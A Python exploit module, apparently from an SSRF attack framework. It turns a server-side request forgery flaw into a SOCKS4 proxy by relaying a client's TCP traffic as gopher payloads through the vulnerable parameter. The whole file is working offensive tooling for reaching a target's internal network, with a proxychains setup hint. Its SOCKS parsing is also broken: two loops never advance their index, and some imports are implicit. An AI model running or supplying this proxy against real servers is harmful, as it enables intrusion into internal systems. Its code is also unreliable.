from core.utils import *
import _thread
import urllib.parse
from urllib.request import urlopen
import logging
import binascii

# NOTE
# Due to the nature of SSRF vulnerabilities, 
# only one response is made from a request.
# You can't get an interactive shell either..

# $ cat /etc/proxychains.conf 
# [ProxyList]
# socks4  127.0.0.1 9000

name          = "socksproxy"
description   = "SOCKS Proxy  - Socks4"
author        = "Swissky"
documentation = [
    "https://github.com/iamultra/ssrfsocks", 
    "https://media.blackhat.com/bh-us-12/Briefings/Polyakov/BH_US_12_Polyakov_SSRF_Business_Slides.pdf"
]

class exploit():
    SOCKS       = True
    HOST        = 'localhost'
    PORT        = 9000
    BUFSIZ      = 4096
    TIMEOUT     = 5

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.HOST, self.PORT))
        server.listen(2)
        logging.info("Listener ready on port {}".format(self.PORT))
        try:
            while 1:
                client, addr = server.accept()
                _thread.start_new_thread(self.child, (client,addr,requester, args))
        except KeyboardInterrupt:
            server.close()

    def child(self, sock, addr, requester, args):
        
        if self.SOCKS:
            req = sock.recv(self.BUFSIZ)
            host, port, extra = self.decodesocks(req)
            if extra == "":
                dest = socket.inet_ntoa(host.encode())
            else:
                dest = extra
            
            destport, = struct.unpack("!H", port.encode())
            sock.send(("\x00\x5a"+port+host).encode() )
            
        data = sock.recv(self.BUFSIZ)
        
        try:
            encodeddata = urllib.parse.quote(data)
            payload = wrapper_gopher(encodeddata, dest , str(destport))
            r = requester.do_request(args.param, payload)

            if r.text != None:
                sock.send(r.text.encode())
            sock.close()

        except Exception as e:
            logging.error(e)
            sock.close()

    def decodesocks(self, req):
        req = req.decode()

        if req[0] != '\x04':
            raise Exception('bad version number')
        if req[1] != '\x01':
            raise Exception('only tcp stream supported')

        port = req[2:4]
        host = req[4:8]
        if host[0] == '\x00' and host[1] == '\x00' and host[2] == '\x00' and host[3] != '\x00':
            byname = True
        else:
            byname = False

        # NOTE: seems useless
        userid = ""
        i = 8
        while req[i] != '\x00':
            userid += req[i]
        extra = ""

        if byname:
            while req[i] != '\x00':
                extra += req[i]

        return host, port, extra